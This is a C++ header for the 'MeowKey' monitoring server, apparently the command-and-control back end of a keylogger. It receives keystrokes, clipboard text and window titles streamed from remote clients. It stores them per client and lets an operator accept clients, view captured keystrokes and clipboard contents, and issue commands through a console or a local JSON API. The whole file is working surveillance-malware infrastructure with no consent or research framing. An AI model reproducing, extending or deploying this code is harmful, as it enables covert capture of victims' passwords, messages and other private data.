

#ifndef SERVER_CROSS_HPP
#define SERVER_CROSS_HPP

#include "../socket_utils_cross.hpp"
#include "../meowkey_database.hpp"
#include "api_server.hpp"
#include <thread>
#include <atomic>
#include <unordered_map>
#include <mutex>
#include <deque>
#include <sstream>
#include <iostream>
#include <memory>
#include <iomanip>
#include <chrono>
#include <cstring>
#include <vector>
#include <cstdlib>
#include <cstdio>
#include <sstream>

#ifdef _WIN32
#include <winsock2.h>
#include <direct.h>
#define getcwd _getcwd
#else
#include <sys/socket.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#endif

using namespace std;

class ClientHandler
{
private:
   
bool in_clipboard_ = false;
string clipboard_buffer_;
uint64_t clipboard_ts_ = 0;


    int client_socket_;
    atomic<bool> running_;
    thread handler_thread_;
    string client_id_;
    uint32_t client_hash_;
    shared_ptr<MeowKeyDatabase> db_;

    deque<string> recent_events_;
    static mutex display_mutex_;

    atomic<int> events_since_sync_;
    static const int SYNC_INTERVAL = 10;

    void displayRecentEvents()
    {
        lock_guard<mutex> lock(display_mutex_);
        cout << "\n=== " << client_id_ << string(45 - client_id_.length(), '-') << "===" << endl;
        if (recent_events_.empty())
        {
            cout << "| (No events)" << string(47, ' ') << "|" << endl;
        }
        else
        {
            for (const auto &e : recent_events_)
            {
                cout << "| " << left << setw(50) << e.substr(0, 50) << "|" << endl;
            }
        }
        cout << string(60, '=') << endl;
    }

    void pushRecent(const string &s)
    {
        lock_guard<mutex> lock(display_mutex_);
        recent_events_.push_back(s);
        if (recent_events_.size() > 20)
            recent_events_.pop_front();
    }



    void processEventLine(const string &line)
{
    if (line.empty())
        return;

    uint64_t ts = MeowKeyDatabase::getCurrentTimestamp();
    string msg = line;

    // Remove trailing whitespace
    while (!msg.empty() && (msg.back() == '\n' || msg.back() == '\r'))
        msg.pop_back();
    if (msg.empty())
        return;

    try
    {
        if (msg.rfind("KEY:", 0) == 0)
        {
            string key = msg.substr(4);
            if (!key.empty() && key[0] == ' ')
                key.erase(0, 1);

            KeystrokeEvent ke(ts, client_hash_, key);
            db_->insertKeystroke(client_hash_, ke);

            pushRecent("[KEY] " + key);
            cout << "✓ Keystroke: " << key << endl;
        }
        else if (msg.rfind("CLIPBOARD:", 0) == 0)
        {
            string content = msg.substr(10);
            if (!content.empty() && content[0] == ' ')
                content.erase(0, 1);

            // Save the header line itself as a clipboard event
            ClipboardEvent ce(ts, client_hash_, content);
            db_->insertClipboard(client_hash_, ce);

            string preview = content.substr(0, 30);
            if (content.size() > 30)
                preview += "...";

            pushRecent("[CLIP] " + preview);
            cout << "✓ Clipboard: " << preview << endl;

            // Now, next lines coming in will also be saved as clipboard if they don't start with [KEY/WINDOW/CLIPBOARD]
            in_clipboard_ = true;
        }
        else if (msg.rfind("WINDOW:", 0) == 0)
        {
            string window = msg.substr(7);
            if (!window.empty() && window[0] == ' ')
                window.erase(0, 1);

            string title = window;
            string process = "Unknown";
            size_t br = window.rfind(" [");
            if (br != string::npos && window.back() == ']')
            {
                title = window.substr(0, br);
                process = window.substr(br + 2, window.size() - br - 3);
            }

            WindowEvent we(ts, client_hash_, title, process);
            db_->insertWindow(client_hash_, we);

            pushRecent("[WIN] " + title.substr(0, 30));
            cout << "✓ Window: " << title.substr(0, 30) << endl;

            in_clipboard_ = false;
        }
        else
        {
            if (in_clipboard_)
            {
                // Treat raw line as a clipboard continuation
                ClipboardEvent ce(ts, client_hash_, msg);
                db_->insertClipboard(client_hash_, ce);

                string preview = msg.substr(0, 30);
                if (msg.size() > 30)
                    preview += "...";

                pushRecent("[CLIP] " + preview);
                cout << "✓ Clipboard (continued): " << preview << endl;
            }
            else
            {
                // Treat raw line as keystroke
                KeystrokeEvent ke(ts, client_hash_, msg);
                db_->insertKeystroke(client_hash_, ke);

                pushRecent("[KEY] " + msg);
                cout << "✓ Keystroke (raw): " << msg << endl;
            }
        }

        displayRecentEvents();

        // Periodic sync
        events_since_sync_++;
        if (events_since_sync_ >= SYNC_INTERVAL)
        {
            db_->syncToDisk();
            events_since_sync_ = 0;
        }
    }
    catch (const exception &e)
    {
        cerr << "❌ Error: " << e.what() << endl;
    }
}


    // void processEventLine(const string &line)
    // {
    //     if (line.empty())
    //         return;

    //     uint64_t ts = MeowKeyDatabase::getCurrentTimestamp();
    //     string msg = line;

    //     // Remove trailing whitespace
    //     while (!msg.empty() && (msg.back() == '\n' || msg.back() == '\r'))
    //         msg.pop_back();
    //     if (msg.empty())
    //         return;

    //     try
    //     {
    //         if (msg.rfind("KEY:", 0) == 0)
    //         {
    //             string key = msg.substr(4);
    //             if (!key.empty() && key[0] == ' ')
    //                 key.erase(0, 1);

    //             KeystrokeEvent ke(ts, client_hash_, key);
    //             db_->insertKeystroke(client_hash_, ke);

    //             pushRecent("[KEY] " + key);
    //             cout << "✓ Keystroke: " << key << endl;
    //         }
    //         else if (msg.rfind("CLIPBOARD:", 0) == 0)
    //         {
    //             string content = msg.substr(10);
    //             if (!content.empty() && content[0] == ' ')
    //                 content.erase(0, 1);

    //             ClipboardEvent ce(ts, client_hash_, content);
    //             db_->insertClipboard(client_hash_, ce);

    //             string preview = content.substr(0, 30);
    //             if (content.size() > 30)
    //                 preview += "...";
    //             pushRecent("[CLIP] " + preview);
    //             cout << "✓ Clipboard: " << preview << endl;
    //         }
    //         else if (msg.rfind("WINDOW:", 0) == 0)
    //         {
    //             string window = msg.substr(7);
    //             if (!window.empty() && window[0] == ' ')
    //                 window.erase(0, 1);

    //             string title = window;
    //             string process = "Unknown";
    //             size_t br = window.rfind(" [");
    //             if (br != string::npos && window.back() == ']')
    //             {
    //                 title = window.substr(0, br);
    //                 process = window.substr(br + 2, window.size() - br - 3);
    //             }

    //             WindowEvent we(ts, client_hash_, title, process);
    //             db_->insertWindow(client_hash_, we);

    //             pushRecent("[WIN] " + title.substr(0, 30));
    //             cout << "✓ Window: " << title.substr(0, 30) << endl;
    //         }
    //         else
    //         {
    //             // Treat as keystroke
    //             KeystrokeEvent ke(ts, client_hash_, msg);
    //             db_->insertKeystroke(client_hash_, ke);
    //             pushRecent("[KEY] " + msg);
    //             cout << "✓ Keystroke (raw): " << msg << endl;
    //         }

    //         displayRecentEvents();

    //         // Periodic sync
    //         events_since_sync_++;
    //         if (events_since_sync_ >= SYNC_INTERVAL)
    //         {
    //             db_->syncToDisk();
    //             events_since_sync_ = 0;
    //         }
    //     }
    //     catch (const exception &e)
    //     {
    //         cerr << "❌ Error: " << e.what() << endl;
    //     }
    // }


    
    void clientLoop()
    {
        char buffer[4096];
        string leftover;

        cout << "👂 Client " << client_id_ << " connected" << endl;

        while (running_)
        {
            ssize_t received = recv(client_socket_, buffer, sizeof(buffer) - 1, 0);
            if (received <= 0)
            {
                if (received == 0)
                    cout << "🔌 Client " << client_id_ << " disconnected" << endl;
                else
                    cerr << "❌ recv error: " << errno << endl;
                break;
            }

            buffer[received] = '\0';
            string data = leftover + string(buffer);
            leftover.clear();

            istringstream stream(data);
            string line;
            while (getline(stream, line))
            {
                if (stream.eof() && !data.empty() && data.back() != '\n')
                {
                    leftover = line;
                    break;
                }
                if (!line.empty())
                    processEventLine(line);
            }
        }

        // Final sync
        cout << "💾 Final sync for " << client_id_ << endl;
        db_->syncToDisk();
        cout << "✅ " << client_id_ << " disconnected" << endl;
    }

public:
    ClientHandler(int sock, const string &id, shared_ptr<MeowKeyDatabase> db)
        : client_socket_(sock), running_(false), client_id_(id),
          db_(db), events_since_sync_(0)
    {
        client_hash_ = ClientRecord::hashString(client_id_);
    }

    ~ClientHandler() { stop(); }

    int getSocket() const { return client_socket_; }

    void start()
    {
        running_ = true;
        handler_thread_ = thread([this]
                                 { clientLoop(); });
    }

    void stop()
    {
        if (!running_)
            return;
        running_ = false;

#ifdef _WIN32
        shutdown(client_socket_, SD_BOTH);
        closesocket(client_socket_);
#else
        shutdown(client_socket_, SHUT_RDWR);
        close(client_socket_);
#endif

        if (handler_thread_.joinable())
            handler_thread_.join();
        cout << "[Handler stopped: " << client_id_ << "]" << endl;
    }

    string getClientId() const { return client_id_; }
    bool isRunning() const { return running_; }
};

mutex ClientHandler::display_mutex_;



class Server
{
private:
    int port_;
    int server_socket_;
    atomic<bool> running_;
    thread accept_thread_;

    unordered_map<string, unique_ptr<ClientHandler>> pending_clients_;
    unordered_map<string, unique_ptr<ClientHandler>> active_clients_;
    mutex clients_mutex_;

    shared_ptr<MeowKeyDatabase> db_;
    string db_file_;

    APIServer api_server_;
    thread api_command_thread_;

    // For capturing command output
    stringstream command_output_;
    mutex output_mutex_;
    string current_cmd_id_;

    string readHandshakeLine(int sock)
    {
        char buffer[1024];
        ssize_t received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (received <= 0)
            return "";

        buffer[received] = '\0';
        string line(buffer);
        size_t end = line.find_first_of("\r\n");
        if (end != string::npos)
            line = line.substr(0, end);
        return line;
    }



    // Capture cout output
    class OutputCapturer
    {
    private:
        streambuf *old_cout_;
        stringstream buffer_;

    public:
        OutputCapturer() : old_cout_(cout.rdbuf())
        {
            cout.rdbuf(buffer_.rdbuf());
        }

        ~OutputCapturer()
        {
            cout.rdbuf(old_cout_);
        }

        string getOutput()
        {
            return buffer_.str();
        }
    };

public:
    void captureOutput(const string &cmd, const function<void()> &action)
    {
        stringstream buffer;
        streambuf *old_cout = cout.rdbuf(buffer.rdbuf());

        try
        {
            action();
        }
        catch (...)
        {
            cout.rdbuf(old_cout);
            throw;
        }

        cout.rdbuf(old_cout);

        // Store output if this is from API
        if (!current_cmd_id_.empty())
        {
            lock_guard<mutex> lock(output_mutex_);
            command_output_ << buffer.str();
            cout << "📝 Captured output for " << current_cmd_id_ << ": "
                 << buffer.str().length() << " chars" << endl;
        }
    }

    void processCommand(const string &cmd)
    {
        istringstream iss(cmd);
        string command;
        iss >> command;

        // Use captureOutput for API commands
        if (!current_cmd_id_.empty())
        {
            captureOutput(cmd, [&]()
                          { processCommandInternal(command, iss); });
        }
        else
        {
            processCommandInternal(command, iss);
        }
    }

    void processCommandInternal(const string &command, istringstream &iss)
    {
        if (command == "accept")
        {
            string id;
            if (iss >> id)
                acceptClient(id);
            else
                cout << "Usage: accept <id>" << endl;
        }
        else if (command == "reject")
        {
            string id;
            if (iss >> id)
                rejectClient(id);
            else
                cout << "Usage: reject <id>" << endl;
        }
        else if (command == "kick")
        {
            string id;
            if (iss >> id)
                kickClient(id);
            else
                cout << "Usage: kick <id>" << endl;
        }
        else if (command == "list")
        {
            listClients();
        }
        else if (command == "clients")
        {
            showAllClients();
        }
        else if (command == "view")
        {
            string id, type = "all";
            if (iss >> id)
            {
                iss >> type;
                viewClientData(id, type);
            }
            else
            {
                cout << "Usage: view <id> [ks|clip|win|all]" << endl;
            }
        }
        else if (command == "stats")
        {
            db_->printStats();
        }
        else if (command == "flush")
        {
            db_->syncToDisk();
            cout << "✅ Database synced" << endl;
        }
        else if (command == "delete")
        {
            string id;
            if (iss >> id)
                deleteClient(id);
            else
                cout << "Usage: delete <id>" << endl;
        }
        else if (command == "help")
        {
            printBanner();
        }
        else if (command == "quit" || command == "exit")
        {
            stop();
        }
        else
        {
            cout << "Unknown command. Type 'help'." << endl;
        }
    }

    Server(int port, const string &db_file = "meowkey_server.db")
        : port_(port), server_socket_(-1), running_(false),
          db_file_(db_file), api_server_(3002)
    {
        db_ = make_shared<MeowKeyDatabase>(db_file_);
        if (!db_->open())
        {
            throw runtime_error("Failed to open database");
        }
        cout << "✅ Database: " << db_file_ << endl;
        db_->printStats();
    }

    ~Server() { stop(); }

    bool start()
    {
        if (running_)
            return false;
        running_ = true;

        // Start API server first
        api_server_.start();

        // Start processing API commands
        api_command_thread_ = thread(&Server::processAPICommands, this);

        server_socket_ = SocketUtils::createSocket();
        SocketUtils::bindSocket(server_socket_, port_);
        SocketUtils::listenSocket(server_socket_);

        accept_thread_ = thread(&Server::acceptLoop, this);
        printBanner();
        return true;
    }

    void stop()
    {
        cout << "\n⏹️  Shutting down server..." << endl;
        running_ = false;

        // Stop API server
        api_server_.stop();

        if (api_command_thread_.joinable())
        {
            api_command_thread_.join();
        }

        if (server_socket_ >= 0)
        {
#ifdef _WIN32
            closesocket(server_socket_);
#else
            shutdown(server_socket_, SHUT_RDWR);
            close(server_socket_);
#endif
            server_socket_ = -1;
        }

        if (accept_thread_.joinable())
            accept_thread_.join();

        {
            lock_guard<mutex> lock(clients_mutex_);
            // Stop all active clients FIRST to flush their data
            for (auto &p : active_clients_)
            {
                cout << "💾 Flushing data for client: " << p.first << endl;
                p.second->stop(); // Each client syncs its data
            }
            active_clients_.clear();

            // Stop pending clients
            for (auto &p : pending_clients_)
                p.second->stop();
            pending_clients_.clear();
        }

        // Now safe to sync DB and close file
        if (db_)
        {
            cout << "💾 Final database sync to disk..." << endl;
            db_->syncToDisk();
            db_->close(); // Close FD AFTER syncing
        }

        SocketUtils::cleanupWSA();
        cout << "✅ Server shutdown complete" << endl;
    }

    void runCommandLoop()
    {
        string line;
        while (running_)
        {
            cout << "meowkey> ";
            if (!getline(cin, line))
                break;
            if (line.empty())
                continue;
            processCommand(line);
        }
    }

private:
    void printBanner()
    {
        cout << "\n╔═══════════════════════════════════════════════════════════╗" << endl;
        cout << "║        🐱 MEOWKEY SERVER - LIVE MONITORING 🐱             ║" << endl;
        cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
        cout << "║ Status: RUNNING                                           ║" << endl;
        cout << "║ Port: " << port_ << string(46 - to_string(port_).length(), ' ') << "║" << endl;
        cout << "║ Database: " << db_file_ << string(41 - db_file_.length(), ' ') << "║" << endl;
        cout << "║ JSON API: http://localhost:3002                           ║" << endl;
        cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
        cout << "║ COMMANDS:                                                 ║" << endl;
        cout << "║   accept <id>      - Accept pending client                ║" << endl;
        cout << "║   reject <id>      - Reject pending client                ║" << endl;
        cout << "║   kick <id>        - Disconnect active client             ║" << endl;
        cout << "║   list             - Show active/pending clients          ║" << endl;
        cout << "║   clients          - Show all registered clients          ║" << endl;
        cout << "║   view <id> <type> - View client data (ks/clip/win/all)   ║" << endl;
        cout << "║   flush            - Flush all data to disk               ║" << endl;
        cout << "║   delete <id>      - Delete client and all data           ║" << endl;
        cout << "║   stats            - Show database statistics             ║" << endl;
        cout << "║   help             - Show this help                      ║" << endl;
        cout << "║   quit             - Stop server                         ║" << endl;
        cout << "╚═══════════════════════════════════════════════════════════╝\n"
             << endl;
    }

    void processAPICommands()
    {
        cout << "🔄 Starting API command processor..." << endl;

        while (running_)
        {
            string cmd_with_id = api_server_.getNextCommand(100);

            if (!cmd_with_id.empty())
            {
                // Extract command ID and actual command
                size_t colon_pos = cmd_with_id.find(':');
                if (colon_pos != string::npos)
                {
                    string cmd_id = cmd_with_id.substr(0, colon_pos);
                    string cmd = cmd_with_id.substr(colon_pos + 1);

                    cout << "📨 API Command [" << cmd_id << "]: " << cmd << endl;

                    // Capture output for this command
                    {
                        lock_guard<mutex> lock(output_mutex_);
                        current_cmd_id_ = cmd_id;
                        command_output_.str(""); // Clear previous output
                        command_output_.clear();
                    }

                    // Process the command
                    processCommand(cmd);

                    // Get the captured output
                    string output;
                    {
                        lock_guard<mutex> lock(output_mutex_);
                        output = command_output_.str();
                        current_cmd_id_ = "";
                    }

                    // Store result in API server
                    api_server_.storeResult(cmd_id, output);

                    cout << "✅ API command processed: " << cmd << endl;
                }
            }

            this_thread::sleep_for(chrono::milliseconds(100));
        }
    }

    void acceptLoop()
    {
        cout << "🔊 Listening on port " << port_ << "..." << endl;

        while (running_)
        {
            int client_sock = accept(server_socket_, nullptr, nullptr);
            if (client_sock < 0)
            {
#ifdef _WIN32
                if (WSAGetLastError() == WSAEWOULDBLOCK)
                {
                    this_thread::sleep_for(chrono::milliseconds(100));
                    continue;
                }
#else
                if (errno == EAGAIN || errno == EWOULDBLOCK)
                {
                    this_thread::sleep_for(chrono::milliseconds(100));
                    continue;
                }
#endif
                cerr << "❌ Accept error: " << errno << endl;
                continue;
            }

            string handshake = readHandshakeLine(client_sock);
            if (handshake.empty())
            {
#ifdef _WIN32
                closesocket(client_sock);
#else
                close(client_sock);
#endif
                continue;
            }

            string client_id;
            size_t colon = handshake.find(':');
            if (colon != string::npos)
            {
                client_id = handshake.substr(colon + 1);
                // Trim whitespace
                size_t start = client_id.find_first_not_of(" \t\r\n");
                size_t end = client_id.find_last_not_of(" \t\r\n");
                if (start != string::npos)
                {
                    client_id = client_id.substr(start, end - start + 1);
                }
            }
            else
            {
                client_id = handshake;
            }

            if (client_id.empty())
            {
#ifdef _WIN32
                closesocket(client_sock);
#else
                close(client_sock);
#endif
                continue;
            }

            handleNewConnection(client_sock, client_id);
        }
    }

    void handleNewConnection(int sock, const string &client_id)
    {
        lock_guard<mutex> lock(clients_mutex_);

        if (pending_clients_.count(client_id) || active_clients_.count(client_id))
        {
            cout << "❌ Client " << client_id << " already connected" << endl;
            string msg = "ERROR: Already connected\n";
            send(sock, msg.c_str(), msg.size(), 0);
#ifdef _WIN32
            closesocket(sock);
#else
            close(sock);
#endif
            return;
        }

        cout << "\n🔔 NEW CONNECTION REQUEST" << endl;
        cout << "   Client ID: " << client_id << endl;
        cout << "   Action: accept " << client_id << " | reject " << client_id << endl;
        cout << string(40, '-') << endl;

        pending_clients_[client_id] = make_unique<ClientHandler>(sock, client_id, db_);
    }

    void acceptClient(const string &client_id)
    {
        lock_guard<mutex> lock(clients_mutex_);

        auto it = pending_clients_.find(client_id);
        if (it == pending_clients_.end())
        {
            cout << "❌ Client not in pending list: " << client_id << endl;
            return;
        }

        auto handler = move(it->second);
        pending_clients_.erase(it);

        // Register client in database
        ClientRecord record;
        bool existing = db_->registerClient(client_id, record);

        // Send approval
        string msg = "APPROVED\n";
        send(handler->getSocket(), msg.c_str(), msg.size(), 0);

        // Start handler
        handler->start();
        active_clients_[client_id] = move(handler);

        cout << "✅ Client accepted: " << client_id << endl;
    }

    void rejectClient(const string &client_id)
    {
        lock_guard<mutex> lock(clients_mutex_);

        auto it = pending_clients_.find(client_id);
        if (it == pending_clients_.end())
        {
            cout << "❌ Client not in pending list: " << client_id << endl;
            return;
        }

        string msg = "REJECTED\n";
        send(it->second->getSocket(), msg.c_str(), msg.size(), 0);
        it->second->stop();
        pending_clients_.erase(it);

        cout << "❌ Client rejected: " << client_id << endl;
    }

    void kickClient(const string &client_id)
    {
        lock_guard<mutex> lock(clients_mutex_);

        auto it = active_clients_.find(client_id);
        if (it != active_clients_.end())
        {
            it->second->stop();
            active_clients_.erase(it);
            cout << "✅ Client kicked: " << client_id << endl;
            return;
        }

        it = pending_clients_.find(client_id);
        if (it != pending_clients_.end())
        {
            it->second->stop();
            pending_clients_.erase(it);
            cout << "✅ Pending client removed: " << client_id << endl;
            return;
        }

        cout << "❌ Client not found: " << client_id << endl;
    }

    void listClients()
    {
        lock_guard<mutex> lock(clients_mutex_);

        stringstream output;

        output << "\nPENDING (" << pending_clients_.size() << "):" << endl;
        if (pending_clients_.empty())
            output << "  (none)" << endl;
        else
            for (auto &p : pending_clients_)
                output << "  " << p.first << endl;

        output << "\nACTIVE (" << active_clients_.size() << "):" << endl;
        if (active_clients_.empty())
            output << "  (none)" << endl;
        else
            for (auto &p : active_clients_)
                output << "  " << p.first << endl;

        // Capture output if called from API
        if (!current_cmd_id_.empty())
        {
            lock_guard<mutex> lock(output_mutex_);
            command_output_ << output.str();
        }
        else
        {
            cout << output.str();
        }
    }

    void showAllClients()
    {
        auto clients = db_->getAllClients();
        stringstream output;

        output << "\nALL REGISTERED CLIENTS IN DATABASE:" << endl;
        if (clients.empty())
        {
            output << "  (no clients)" << endl;
        }
        else
        {
            for (auto &id : clients)
            {
                ClientRecord rec;
                if (db_->getClientStats(id, rec))
                {
                    output << "  * " << id << " | Sessions: " << rec.session_count
                           << " KS:" << rec.total_keystrokes
                           << " CB:" << rec.total_clipboard
                           << " W:" << rec.total_windows << endl;
                }
            }
        }

        // Capture output if called from API
        if (!current_cmd_id_.empty())
        {
            lock_guard<mutex> lock(output_mutex_);
            command_output_ << output.str();
        }
        else
        {
            cout << output.str();
        }
    }


void viewClientData(const string &client_id, const string &type)
{
    QueryResult result;
    if (!db_->queryClientAllEvents(client_id, result))
    {
        string msg = "❌ Failed to query client: " + client_id;
        if (!current_cmd_id_.empty())
        {
            lock_guard<mutex> lock(output_mutex_);
            command_output_ << msg << endl;
        }
        else
        {
            cout << msg << endl;
        }
        return;
    }

    stringstream output;
    output << "\nDATA FOR CLIENT: " << client_id << endl;

    if (type == "all" || type == "ks")
    {
        output << "\nKEYSTROKES (" << result.keystrokes.size() << "):" << endl;
        for (size_t i = 0; i < result.keystrokes.size(); ++i)
        {
            output << "  " << (i + 1) << ". [" << result.keystrokes[i].timestamp
                   << "] " << result.keystrokes[i].key << endl;
        }
    }

    if (type == "all" || type == "clip")
    {
        output << "\nCLIPBOARD (" << result.clipboard_events.size() << "):" << endl;
        for (size_t i = 0; i < result.clipboard_events.size(); ++i)
        {
            // **FIX: Add null pointer check**
            if (result.clipboard_events[i].content == nullptr || 
                result.clipboard_events[i].content_length == 0)
            {
                output << "  " << (i + 1) << ". [" << result.clipboard_events[i].timestamp
                       << "] (empty)" << endl;
                continue;
            }
            
            // **FIX: Use safe string construction**
            string content;
            try {
                content = string(result.clipboard_events[i].content,
                               result.clipboard_events[i].content_length);
            } catch (...) {
                content = "(invalid data)";
            }
            
            output << "  " << (i + 1) << ". [" << result.clipboard_events[i].timestamp
                   << "] " << content.substr(0, 50);
            if (content.size() > 50)
                output << "...";
            output << endl;
        }
    }

    if (type == "all" || type == "win")
    {
        output << "\nWINDOWS (" << result.window_events.size() << "):" << endl;
        for (size_t i = 0; i < result.window_events.size(); ++i)
        {
            output << "  " << (i + 1) << ". [" << result.window_events[i].timestamp
                   << "] " << result.window_events[i].title
                   << " [" << result.window_events[i].process << "]" << endl;
        }
    }

    // Capture output if called from API
    if (!current_cmd_id_.empty())
    {
        lock_guard<mutex> lock(output_mutex_);
        command_output_ << output.str();
    }
    else
    {
        cout << output.str();
    }
}

void deleteClient(const string &client_id)
{
    // First, try to disconnect if they're currently connected
    {
        lock_guard<mutex> lock(clients_mutex_);
        
        auto it = active_clients_.find(client_id);
        if (it != active_clients_.end())
        {
            cout << "🔌 Disconnecting active client: " << client_id << endl;
            it->second->stop();
            active_clients_.erase(it);
        }
        
        auto pit = pending_clients_.find(client_id);
        if (pit != pending_clients_.end())
        {
            cout << "🔌 Removing pending client: " << client_id << endl;
            pit->second->stop();
            pending_clients_.erase(pit);
        }
    }
    
    // Now delete from database (whether they were connected or not)
    if (db_->deleteClient(client_id))
    {
        cout << "✅ Client deleted from database: " << client_id << endl;
    }
    else
    {
        cout << "❌ Database deletion failed: " << client_id << endl;
    }
}


    // void deleteClient(const string &client_id)
    // {
    //     kickClient(client_id);
    //     if (db_->deleteClient(client_id))
    //     {
    //         cout << "✅ Client deleted: " << client_id << endl;
    //     }
    //     else
    //     {
    //         cout << "❌ Delete failed: " << client_id << endl;
    //     }
    // }
};

#endif